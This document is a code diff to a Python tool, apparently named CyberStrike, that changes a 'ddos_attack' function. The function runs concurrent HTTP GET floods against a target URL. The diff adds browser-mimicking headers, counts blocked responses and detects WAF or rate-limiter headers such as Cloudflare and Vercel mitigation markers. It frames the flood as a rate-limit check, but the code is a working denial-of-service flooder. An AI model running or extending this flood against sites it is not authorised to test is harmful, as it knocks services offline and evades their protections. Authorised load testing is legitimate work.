@@ -79,11 +79,16 @@ class SecureMetrics(dict):
 metrics = SecureMetrics()
 metrics_lock = metrics.lock
 
+BLOCKED_STATUS_CODES = {401, 403, 406, 407, 413, 418, 423, 429, 444, 451}
+
 async def record_request_metric(success: bool, req_time: Optional[float] = None, status_code: Optional[int] = None):
     async with metrics.lock:
         metrics["total_requests"] += 1
-        is_ok = bool(success) and (status_code is None or (100 <= status_code < 400))
-        if is_ok:
+        is_blocked_or_dropped = (
+            (not success)
+            or (status_code is not None and (status_code >= 500 or status_code in BLOCKED_STATUS_CODES))
+        )
+        if not is_blocked_or_dropped:
             metrics["successful_requests"] += 1
         else:
             metrics["failed_requests"] += 1
@@ -152,45 +157,67 @@ manager = ConnectionManager()
 
 # Attack functions
 async def ddos_attack(url: str, duration: int, intensity: int, threads: int, attack_id: str):
-    timeout_cfg = aiohttp.ClientTimeout(total=2.5, sock_connect=1.5, sock_read=2.0)
+    target_url = format_url(url)
+    timeout_cfg = aiohttp.ClientTimeout(total=4.0, sock_connect=2.0, sock_read=3.0)
     connector = aiohttp.TCPConnector(ssl=False, limit=100)
     finding_logged = False
+    waf_logged = False
     ok_count = 0
+    block_count = 0
     async with aiohttp.ClientSession(connector=connector, timeout=timeout_cfg) as session:
         start_time = time.time()
         tasks = []
         
         async def send_request():
-            nonlocal finding_logged, ok_count
+            nonlocal finding_logged, waf_logged, ok_count, block_count
             while time.time() - start_time < duration and metrics["attacks_running"]:
                 try:
                     headers = {
                         "User-Agent": random.choice([
-                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
-                            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
+                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+                            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+                            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
                         ]),
+                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                        "Accept-Language": "en-US,en;q=0.9",
                         "X-CyberStrike-Module": "ddos"
                     }
                     
                     req_start = time.time()
-                    async with session.get(url, headers=headers) as response:
+                    async with session.get(target_url, headers=headers) as response:
+                        await response.read()
                         req_time = time.time() - req_start
-                        await record_request_metric(True, req_time, response.status)
+                        await record_request_metric(response.status < 500, req_time, response.status)
                         if response.status < 400:
                             ok_count += 1
-                            if not finding_logged and ok_count >= 10:
+                            if not finding_logged and ok_count >= 10 and block_count == 0:
                                 finding_logged = True
                                 await _broadcast_finding({
                                     "type": "Unthrottled HTTP Flood / Missing Rate Limit (DDoS)",
                                     "severity": "Medium",
-                                    "url": url,
+                                    "url": target_url,
                                     "payload": f"Concurrent Multi-Worker HTTP GET Flood ({threads} workers)",
                                     "detail": "Target processed sustained high-concurrency HTTP flood traffic without enforcing HTTP 429 Too Many Requests or connection throttling.",
                                     "evidence": f"HTTP {response.status} | {ok_count}+ unthrottled flood requests | RTT: {req_time*1000:.1f} ms",
                                     "timestamp": datetime.now().isoformat(),
                                     "attack_id": attack_id
                                 })
+                        elif response.status in (401, 403, 429, 503):
+                            block_count += 1
+                            if not waf_logged:
+                                waf_logged = True
+                                srv = response.headers.get("Server", "Edge")
+                                mitigated = (
+                                    response.headers.get("X-Vercel-Mitigated")
+                                    or response.headers.get("CF-Mitigated")
+                                    or response.headers.get("Retry-After")
+                                    or "WAF/Rate-Limiter"
+                                )
+                                await manager.broadcast(json.dumps({
+                                    "type": "log",
+                                    "message": f"[WAF / Protection Active] {target_url} returned HTTP {response.status} (Server: {srv} | Mitigation: {mitigated}) after {ok_count} accepted requests",
+                                    "level": "warning"
+                                }))
                         
                         await manager.broadcast(json.dumps({
                             "type": "metrics",
@@ -209,7 +236,7 @@ async def ddos_attack(url: str, duration: int, intensity: int, threads: int, att
                         await asyncio.sleep(sleep_delay + jitter)
                 except Exception:
                     await record_request_metric(False)
-                    await asyncio.sleep(0.02 + random.uniform(0.005, 0.03))
+                    await asyncio.sleep(max(1.0 / max(intensity, 1), 0.1))
         
         for _ in range(threads):
             task = asyncio.create_task(send_request())
